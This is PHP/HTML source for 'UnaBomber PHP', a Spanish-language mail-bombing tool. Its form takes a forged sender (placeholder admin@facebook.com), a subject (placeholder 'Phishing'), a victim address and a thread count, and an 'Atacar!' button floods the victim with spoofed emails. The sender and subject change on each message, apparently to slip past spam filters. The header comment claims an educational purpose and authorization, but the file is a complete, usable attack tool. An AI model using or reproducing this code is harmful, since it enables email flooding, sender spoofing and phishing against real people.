<!DOCTYPE html>
<!--
El siguiente Script fue desarrollado con propositos de prevención y educación ante amenazas de ataques masivos a Servidores de Correo.
Verificación del funcionamiento de Filtros de Spam, Phishing y ataques masivos.

El usuario acepta tener autorización del servidor del correo de la victima y del servidor que hospeda el Script para poder realizar el ataque

Desarrollado por: @HackeaMesta | @xoraorg
Página: www.xora.org/unabomber
Mirror: www.github.com/HackeaMesta
Licencia: Compartir - copiar, distribuir, ejecutar y comunicar públicamente la obra, hacer obras derivadas. http://creativecommons.org/licenses/by-nc-sa/2.5/mx/
-->
<html lang="es">
<head>
  <meta charset="utf-8">
	<meta name="application-name" content="UnaBomber PHP">
	<meta name="description" content="Mail Bomber para envio masivo de Email por PHP">
	<meta name="author" content="@HackeaMesta">
	<title>UnaBomber PHP</title>

	<link rel="icon" type="image/png" href="http://xora.org/favicon.ico">

	<!-- Fuentes CSS -->
	<style type="text/css">
		strong { 
		font-weight: bold;
		color: #FF0040; }

		.boton {
  		background: none repeat scroll 0 0 #D8D8D8;
		border-radius: 5px 5px 5px 5px;
		color: #000000;
		font-weight: bold;
		padding: 5px; }

		input{
		border:  solid 1px #2E9AFE;
		border-color: #2E9AFE;
		border-radius: 3px 3px 3px 3px; }

		textarea{
		border:  solid 2px #2E9AFE;
		border-color: #2E9AFE;
		border-radius: 3px 3px 3px 3px;	}

		.center{
		margin-left: auto;
		margin-right: auto;
		width:70%; }

		body{
		color: #E6E6E6;
		background-image:  url('http://i.imgur.com/dyllFKf.png'); /* Imagen por Ashishmalik1 0 http://gnome-look.org/content/show.php/Futuristic+Conky+Terminus?content=157049 */
		background-size:100% 150%;
		background-repeat: no-repeat;
		margin-top: 5%; }

		hr{
		border-color: #00FF00; }
	</style>
</head>

<body>
<div class="center">
<form action="" method="POST">
<table>
	<tr>
		<td><label>Nombre (falso): </label></td>
		<td><input name="nombre" type="text" size="35" placeholder="Anonymous"></td>
	</tr>
	<tr>
		<td><label>Email (falso): <strong>*</strong></label></td>
		<td><input name="email" type="email" size="35" placeholder="admin@facebook.com" required></td>
	</tr>
	<tr>
		<td><label>Asunto: <strong>*</strong></label></td>
		<td><input name="asunto" type="text" size="35" placeholder="Phishing" required></td>
	</tr>
	<tr>
		<td><label>Email (victima): <strong>*</strong></label></td>
		<td><input name="victima" type="email" size="35" placeholder="victima@gmail.com" required></td>
	</tr>
	<tr>
		<td><label>Threads: <strong>*</strong></label></td>
		<td><input name="threads" type="number" size="35" value="10" required></td>
	</tr>
	<tr>
		<td><label>Mensaje: </label></td>
		<td><textarea name="mensaje" cols="35" rows="7" required></textarea></td>
	</tr>
	<tr>
		<td><label>Enviar como HTML </label></td>
		<td><input name="tipoHtml" type="checkbox"></td>
	</tr>
	<tr>
		<td></td>
		<td align="right"><input name="enviar" class="boton" type="submit" value="Atacar!"></td>
	</tr>
</table>
</form>
<hr>
<?php
//Recopilar Datos
$nombre = htmlspecialchars($_POST['nombre'], ENT_QUOTES);
$email = htmlspecialchars($_POST['email'], ENT_QUOTES);
$asunto = htmlspecialchars($_POST['asunto'], ENT_QUOTES);
$victima = htmlspecialchars($_POST['victima'], ENT_QUOTES);
$threads = htmlspecialchars($_POST['threads'], ENT_QUOTES);

if (isset($_POST['enviar'])) {

	//El contenido se envia como HTML
	if (isset($_POST['tipoHtml'])){

		//Validar que Threads sea mayor a 0
		if ($threads > '0') {

			$j = 0;
			//Modificar Email y Asunto autoincrementando
			for ( $i = 0; $i < $threads; $i++ )
			{

			$email1 = explode('@', $email);
			$email1[0] = "$email1[0]-$i";
			$email1 = implode('@', $email1);

			$asunto1 = "$asunto [$i]";
			$mensajeHTML = $_POST['mensaje'];

			//Modificar Cabezeras del Email
			$headers = "From: $email1" . "\r\n";
			$headers .= "Reply-To: $email1" . "\r\n";
			$headers .= "Content-type: text/html; charset=utf-8\r\n";

			// Si el email no se envia muestra error
			if( !@mail($victima, $asunto1, $mensajeHTML, $headers))
				{
					echo '<span style="color:red">Fallaron: </span>', $i, ' mensajes <br />';
					if ($j > 34)
					{
						$j = 0;
						echo '<br />' . "\n";
					}
				}

				// Si el email se envia muestra mensaje
				else
				{
					if ($j > 34)
					{
						$j = 0;
						echo '<br />' . "\n";
					}
					echo '<span style="color:green">Enviado correctamente: </span>',  $i, ' mensajes <br />';
				}
				$j++;
			}
			echo "<br />Se envio el siguiente mensaje: <br /> <html>$mensajeHTML</html>";
		}
		else {
			echo "Threads debe ser mayor a <strong>0</strong>";
		}
	}

	//El Mensaje se envia como Texto Plano
	else{

		//Validar que Threads sea mayor a 0
		if ($threads > '0') {
			$j = 0;
			//Modificar Email y Asunto autoincrementando
			for ( $i = 0; $i < $threads; $i++ )
			{

			$email1 = explode('@', $email);
			$email1[0] = "$email1[0]-$i";
			$email1 = implode('@', $email1);

			$asunto1 = "$asunto [$i]";
			$mensaje = htmlentities($_POST['mensaje']);

			//Modificar Cabezeras del Email
			$headers = "From: $email1" . "\r\n";
			$headers .= "Reply-To: $email1" . "\r\n";
			$headers .= "X-Mailer: PHP/" . phpversion();
			$headers .= "Content-type: text/html; charset=utf-8\r\n";

			// Si el email no se envia muestra error
			if( !@mail($victima, $asunto1, $mensaje, $headers))
				{
					echo '<span style="color:red">Fallaron: </span>', $i, ' mensajes <br />';
					if ($j > 34)
					{
						$j = 0;
						echo '<br />' . "\n";
					}
				}

				// Si el email se envia muestra mensaje
				else
				{
					if ($j > 34)
					{
						$j = 0;
						echo '<br />' . "\n";
					}
					echo '<span style="color:green">Enviado correctamente: </span>',  $i, ' mensajes <br />';
				}
				$j++;
			}
			echo "<br />Se envio el siguiente mensaje: <br /> <html>$mensaje</html>";

		}
		else {
			echo "Threads debe ser mayor a <strong>0</strong>";
		}
	}
}
else{
	echo "Los campos con <strong>*</strong> son obligatorios";
}
?>
</body>
<hr>
<!-- No modificar -->
<footer>
	<h5><a target="_blank" rel="license" href="http://creativecommons.org/licenses/by-nc-sa/2.5/mx/"><img alt="Licencia Creative Commons" style="border-width:0" src="http://i.creativecommons.org/l/by-nc-sa/2.5/mx/88x31.png" /></a><br />UnaBomber PHP V. 2.0.1 está bajo una <a target="_blank" rel="license" href="http://creativecommons.org/licenses/by-nc-sa/2.5/mx/">Licencia Creative Commons Atribución-NoComercial-CompartirIgual 2.5 México</a>.<br /> @<a target ='_blank' href='http://twitter.com/xoraorg'>xoraorg</a> | @<a target ='_blank' href='http://twitter.com/HackeaMesta'>HackeaMesta</a> | <a target ='_blank' href='http://xora.org'>www.xora.org</a> | <a target ='_blank' href='mailto:contacto@xora.org'>contacto@xora.org</a></h5>
</footer>
</div>
</html>
